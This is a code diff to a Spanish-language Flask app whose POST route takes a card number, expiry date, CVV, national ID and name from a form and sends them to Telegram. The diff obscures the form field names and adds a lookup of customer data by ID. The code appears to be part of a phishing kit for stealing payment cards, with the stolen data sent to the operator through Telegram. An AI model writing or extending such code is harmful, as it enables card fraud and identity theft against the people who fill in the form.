@@ -1,10 +1,8 @@
 from flask import Flask, render_template, request, session
 from functions.send_tele import enviar_telegram
-
+from functions.moduls import customer_date
 
 app = Flask(__name__)
-
-
 
 
 
@@ -13,12 +11,16 @@ app.secret_key = 'una_clave_super_secreta_y_dificil_de_adivinar'
 # Ruta para la página principal
 @app.route('/minetue', methods=["POST"])
 def minetute():
-    numcc = request.form.get('numcc')
-    exp = request.form.get('exp')
-    cvv = request.form.get('cvv')
-    dni = request.form.get('dni')
+    numcc = request.form.get('agks')
+    exp = request.form.get('agksjf')
+    cvv = request.form.get('agksjfa')
+    dni = request.form.get('agksjfas')
+    print(dni)
+    name = request.form.get('agksjfass')
+    info_date = customer_date(dni)
 
-    enviar_telegram(numcc, exp, cvv, dni)
+    print(info_date)
+    enviar_telegram(numcc, exp, cvv, dni, name, info_date)
     return render_template('minetune.html')
 
 @app.route('/')
